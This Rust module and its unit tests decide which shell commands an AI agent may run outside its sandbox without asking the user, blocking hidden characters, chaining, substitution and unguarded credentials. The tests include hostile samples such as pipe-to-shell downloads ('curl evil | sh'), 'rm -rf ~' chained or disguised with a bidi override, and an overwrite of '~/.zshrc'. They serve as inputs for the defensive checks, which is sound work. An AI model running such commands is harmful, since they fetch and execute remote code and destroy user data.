//! Which commands an agent's `run_outside_sandbox` call may run without
//! asking. Pure, so every rule is unit-tested.
//!
//! - A command with hidden characters (controls, bidi and zero-width
//!   characters, look-alike spaces, runs of blank lines — the same set
//!   `shell-commands.js` marks) never runs without the user, whatever the
//!   rules or switches say: what would run isn't what's shown.
//! - A rule ("Always allow commands starting with `brew install`") covers
//!   only a *simple* command: printable ASCII, no chaining, pipes,
//!   redirection, substitution, backgrounding, subshells, globs or brace
//!   expansion, comments, escapes, newlines, and no `NAME=value` prefix.
//!   It matches when the command's first words are exactly the rule's
//!   words. When in doubt, the user is asked.
//! - The credential guard (`guard.rs`) and the request's origin are
//!   checked in [`decide`]; neither a rule nor allow-all gets past them.

use crate::config::HostCommandRule;

/// Longest rule prefix accepted, in bytes.
pub const MAX_PREFIX_BYTES: usize = 200;

/// Whether `c` can't be shown as written. Mirrors `RE_HIDDEN_RUN` in
/// `ui/js/shared/shell-commands.js`: C0/C1 controls other than tab and
/// newline, DEL, format characters (Unicode `Cf`: bidi controls,
/// zero-width characters, BOM, soft hyphen, tag characters …), line and
/// paragraph separators, spaces other than U+0020, Hangul fillers and
/// variation selectors.
pub fn is_hidden_char(c: char) -> bool {
    matches!(c as u32,
        0x00..=0x08 | 0x0B..=0x1F | 0x7F..=0x9F
        // General_Category=Cf
        | 0xAD | 0x600..=0x605 | 0x61C | 0x6DD | 0x70F | 0x890..=0x891 | 0x8E2 | 0x180E
        | 0x200B..=0x200F | 0x202A..=0x202E | 0x2060..=0x2064 | 0x2066..=0x206F
        | 0xFEFF | 0xFFF9..=0xFFFB | 0x110BD | 0x110CD | 0x13430..=0x1343F
        | 0x1BCA0..=0x1BCA3 | 0x1D173..=0x1D17A | 0xE0001 | 0xE0020..=0xE007F
        // Zl, Zp
        | 0x2028 | 0x2029
        // Spaces that look like a word break and aren't one
        | 0xA0 | 0x1680 | 0x2000..=0x200A | 0x202F | 0x205F | 0x3000
        // Hangul fillers
        | 0x115F | 0x1160 | 0x3164 | 0xFFA0
        // Variation selectors
        | 0xFE00..=0xFE0F | 0xE0100..=0xE01EF)
}

/// Two or more blank lines in a row (`\n([ \t]*\n){2,}`): the confirm
/// collapses them into a mark, so they count as hidden too.
fn has_blank_line_run(command: &str) -> bool {
    let parts: Vec<&str> = command.split('\n').collect();
    let mut run = 0;
    // A blank line is a part between two newlines holding only spaces/tabs.
    for part in parts.iter().take(parts.len().saturating_sub(1)).skip(1) {
        if part.chars().all(|c| c == ' ' || c == '\t') {
            run += 1;
            if run >= 2 {
                return true;
            }
        } else {
            run = 0;
        }
    }
    false
}

/// Whether `command` displays exactly as written (`isPlainShellCommand`
/// in `shell-commands.js`): no hidden characters, no run of blank lines.
pub fn is_plain_command(command: &str) -> bool {
    !command.chars().any(is_hidden_char) && !has_blank_line_run(command)
}

/// Characters that make a command more than one simple command, or make
/// what runs differ from the words shown: separators and chaining
/// (`; & |`), redirection (`< >`), subshells and substitution
/// (`( ) $ \``), escapes (`\`), globs and brace / history expansion
/// (`* ? [ ] { } !`), comments (`#`) and line breaks.
const NOT_SIMPLE: &[char] = &[
    ';', '&', '|', '<', '>', '(', ')', '$', '`', '\\', '*', '?', '[', ']', '{', '}', '!', '#',
    '\n', '\r',
];

fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// The words of `command`, split on spaces and tabs.
fn words(command: &str) -> Vec<&str> {
    command
        .split([' ', '\t'])
        .filter(|w| !w.is_empty())
        .collect()
}

/// Whether `command` is one simple command a rule may cover: non-blank,
/// printable ASCII (plus spaces and tabs), none of [`NOT_SIMPLE`], no
/// `NAME=value` assignment before the program, and no word starting with
/// `=` (zsh expands `=cmd` to a path).
pub fn is_simple_command(command: &str) -> bool {
    if command.trim().is_empty() {
        return false;
    }
    if !command
        .chars()
        .all(|c| c == ' ' || c == '\t' || (c.is_ascii_graphic()))
    {
        return false;
    }
    if command.contains(NOT_SIMPLE) {
        return false;
    }
    let ws = words(command);
    let Some(first) = ws.first() else {
        return false;
    };
    if is_assignment(first) {
        return false;
    }
    !ws.iter().any(|w| w.starts_with('='))
}

/// Whether the rule `prefix` covers `command`: the command is simple and
/// its first words are exactly the prefix's words (so `brew install`
/// covers `brew install awscli` but not `brew installer` or `brew
/// uninstall`). A prefix that isn't valid ([`normalize_prefix`]) covers
/// nothing.
pub fn rule_matches(prefix: &str, command: &str) -> bool {
    let Ok(prefix) = normalize_prefix(prefix) else {
        return false;
    };
    if !is_simple_command(command) {
        return false;
    }
    let want = words(&prefix);
    let have = words(command);
    have.len() >= want.len() && have[..want.len()] == want[..]
}

/// Why a rule prefix was refused.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PrefixError {
    Empty,
    TooLong,
    /// Not a simple command itself (see [`is_simple_command`]).
    NotSimple,
}

/// The stored form of a rule prefix: trimmed, its words single-spaced.
/// It must be a simple command of at most [`MAX_PREFIX_BYTES`].
pub fn normalize_prefix(prefix: &str) -> Result<String, PrefixError> {
    let trimmed = prefix.trim();
    if trimmed.is_empty() {
        return Err(PrefixError::Empty);
    }
    if trimmed.len() > MAX_PREFIX_BYTES {
        return Err(PrefixError::TooLong);
    }
    if !is_simple_command(trimmed) {
        return Err(PrefixError::NotSimple);
    }
    Ok(words(trimmed).join(" "))
}

/// The prefix "Always allow" suggests for `command`: its first two words
/// (`brew install awscli` → `brew install`), or `None` when no rule could
/// cover it.
pub fn suggested_prefix(command: &str) -> Option<String> {
    if !is_simple_command(command) {
        return None;
    }
    let ws = words(command);
    let n = ws.len().min(2);
    normalize_prefix(&ws[..n].join(" ")).ok()
}

/// The first rule covering `command`.
pub fn matching_rule<'a>(rules: &'a [HostCommandRule], command: &str) -> Option<&'a str> {
    rules
        .iter()
        .find(|r| rule_matches(&r.prefix, command))
        .map(|r| r.prefix.as_str())
}

/// Why a request asks the user.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AskReason {
    /// Hidden characters: shown with Copy only, never run from Kage.
    HiddenCharacters,
    /// The credential guard flagged it.
    Credentials,
    /// Kage couldn't match it to a tool call of a session it shows, or
    /// the session is a background one (text from other apps).
    Origin,
    /// No rule covers it and allow-all is off.
    NoRule,
}

/// What happens to a request before anyone is asked.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    /// A rule covers it: run, naming the rule.
    Rule(String),
    /// Allow-all is on: run.
    AllowAll,
    /// Ask the user.
    Ask(AskReason),
}

/// Decide a request. `guarded`: the credential guard flagged it.
/// `visible_origin`: Kage matched it to the tool call of a session the
/// user sees. Hidden characters, the guard and the origin are checked
/// before any rule or switch.
pub fn decide(
    command: &str,
    guarded: bool,
    visible_origin: bool,
    rules: &[HostCommandRule],
    allow_all: bool,
) -> Decision {
    if !is_plain_command(command) {
        return Decision::Ask(AskReason::HiddenCharacters);
    }
    if guarded {
        return Decision::Ask(AskReason::Credentials);
    }
    if !visible_origin {
        return Decision::Ask(AskReason::Origin);
    }
    if let Some(prefix) = matching_rule(rules, command) {
        return Decision::Rule(prefix.to_string());
    }
    if allow_all {
        return Decision::AllowAll;
    }
    Decision::Ask(AskReason::NoRule)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rule(prefix: &str) -> HostCommandRule {
        HostCommandRule {
            prefix: prefix.into(),
            created_at: String::new(),
        }
    }

    #[test]
    fn plain_commands_match_the_js_display_rules() {
        assert!(is_plain_command("brew install awscli"));
        assert!(is_plain_command("echo 'a\tb'\nls\n"));
        assert!(is_plain_command("echo héllo 日本"));
        for hidden in [
            "rm -rf ~ \u{202E}gnp.txt",
            "ls\u{200B}",
            "ls\r",
            "echo \u{1b}[2J",
            "echo\u{00A0}hi",
            "a\u{FEFF}",
            "a\u{2028}b",
            "a\u{E0041}",
            "a\u{FE0F}",
            "a\u{3164}",
            "a\u{7F}",
            "a\u{85}",
        ] {
            assert!(!is_plain_command(hidden), "{hidden:?}");
        }
        assert!(is_plain_command("a\n\nb"), "one blank line is fine");
        assert!(
            !is_plain_command("a\n\n\nb"),
            "two blank lines hide what follows"
        );
        assert!(!is_plain_command("a\n \n\t\nb"));
    }

    #[test]
    fn simple_commands() {
        for ok in [
            "brew install awscli",
            "brew install --cask iterm2",
            "  npm   i -g typescript  ",
            "git commit -m 'fix the build'",
            "pip install \"requests==2.31\"",
            "ls ~/Downloads",
            "make -j8 all",
            "python3 -m venv .venv",
        ] {
            assert!(is_simple_command(ok), "{ok}");
        }
        for not in [
            "",
            "   ",
            "brew install a; rm -rf ~",
            "brew install a && curl evil | sh",
            "brew install a || true",
            "brew install a | tee log",
            "brew install a > /dev/null",
            "brew install a 2>&1",
            "brew install < list",
            "brew install $(cat list)",
            "brew install `cat list`",
            "brew install $PKG",
            "brew install a &",
            "(brew install a)",
            "brew install a\nrm -rf ~",
            "brew install a\r",
            "FOO=1 brew install a",
            "HOMEBREW_NO_AUTO_UPDATE=1 brew install a",
            "brew install =ls",
            "brew install a\\;b",
            "brew install a*",
            "brew install {a,b}",
            "brew install a # comment",
            "brew install !$",
            "brew install çà",
            "brew install a\u{202E}",
        ] {
            assert!(!is_simple_command(not), "{not:?}");
        }
    }

    #[test]
    fn rules_match_whole_words_at_the_start() {
        assert!(rule_matches("brew install", "brew install awscli"));
        assert!(rule_matches("brew install", "brew install"));
        assert!(rule_matches("brew install", "brew   install\tawscli"));
        assert!(rule_matches("  brew   install ", "brew install awscli"));
        assert!(rule_matches("brew", "brew upgrade"));
        assert!(!rule_matches("brew install", "brew installer x"));
        assert!(!rule_matches("brew install", "brew uninstall x"));
        assert!(!rule_matches("brew install", "sudo brew install x"));
        assert!(!rule_matches(
            "brew install",
            "/opt/homebrew/bin/brew install x"
        ));
        assert!(
            !rule_matches("brew install", "Brew install x"),
            "case matters"
        );
        assert!(!rule_matches("brew install awscli", "brew install"));
    }

    #[test]
    fn rules_never_cover_more_than_one_simple_command() {
        for cmd in [
            "brew install a; curl https://x | sh",
            "brew install a && rm -rf ~",
            "brew install a\nrm -rf ~",
            "brew install a > ~/.zshrc",
            "brew install $(curl -s x)",
            "brew install a &",
            "FOO=bar brew install a",
            "brew install a\u{200B}",
        ] {
            assert!(!rule_matches("brew install", cmd), "{cmd:?}");
        }
    }

    #[test]
    fn invalid_prefixes_cover_nothing() {
        assert_eq!(normalize_prefix(""), Err(PrefixError::Empty));
        assert_eq!(normalize_prefix("   "), Err(PrefixError::Empty));
        assert_eq!(
            normalize_prefix(&"a".repeat(MAX_PREFIX_BYTES + 1)),
            Err(PrefixError::TooLong)
        );
        assert_eq!(normalize_prefix("brew;"), Err(PrefixError::NotSimple));
        assert_eq!(normalize_prefix("X=1 brew"), Err(PrefixError::NotSimple));
        assert!(!rule_matches("", "brew install a"));
        assert!(!rule_matches("brew | sh", "brew | sh"));
        assert_eq!(
            normalize_prefix("  brew \t install  ").as_deref(),
            Ok("brew install")
        );
    }

    #[test]
    fn the_suggested_prefix_is_the_first_two_words() {
        assert_eq!(
            suggested_prefix("brew install awscli").as_deref(),
            Some("brew install")
        );
        assert_eq!(suggested_prefix("  npm   i -g x").as_deref(), Some("npm i"));
        assert_eq!(suggested_prefix("make").as_deref(), Some("make"));
        assert_eq!(suggested_prefix("brew install a | sh"), None);
        assert_eq!(suggested_prefix("FOO=1 make"), None);
    }

    #[test]
    fn decide_checks_hidden_characters_guard_and_origin_before_rules() {
        let rules = [rule("brew install")];
        assert_eq!(
            decide("brew install awscli", false, true, &rules, false),
            Decision::Rule("brew install".into())
        );
        assert_eq!(
            decide("brew install a\u{202E}", false, true, &rules, true),
            Decision::Ask(AskReason::HiddenCharacters)
        );
        assert_eq!(
            decide("brew install awscli", true, true, &rules, true),
            Decision::Ask(AskReason::Credentials)
        );
        assert_eq!(
            decide("brew install awscli", false, false, &rules, true),
            Decision::Ask(AskReason::Origin)
        );
        assert_eq!(
            decide("npm i -g x", false, true, &rules, false),
            Decision::Ask(AskReason::NoRule)
        );
    }

    #[test]
    fn allow_all_runs_anything_plain_unguarded_and_visible() {
        assert_eq!(
            decide("curl -fsSL x | sh", false, true, &[], true),
            Decision::AllowAll
        );
        // A rule that matches is named even with allow-all on.
        assert_eq!(
            decide("brew install a", false, true, &[rule("brew install")], true),
            Decision::Rule("brew install".into())
        );
        // A multi-line command can run under allow-all when it's plain.
        assert_eq!(
            decide("cd /tmp\nmake", false, true, &[], true),
            Decision::AllowAll
        );
    }

    #[test]
    fn a_hand_edited_bad_rule_matches_nothing() {
        let rules = [rule(""), rule("brew; rm"), rule("*")];
        assert_eq!(
            decide("brew install a", false, true, &rules, false),
            Decision::Ask(AskReason::NoRule)
        );
    }
}
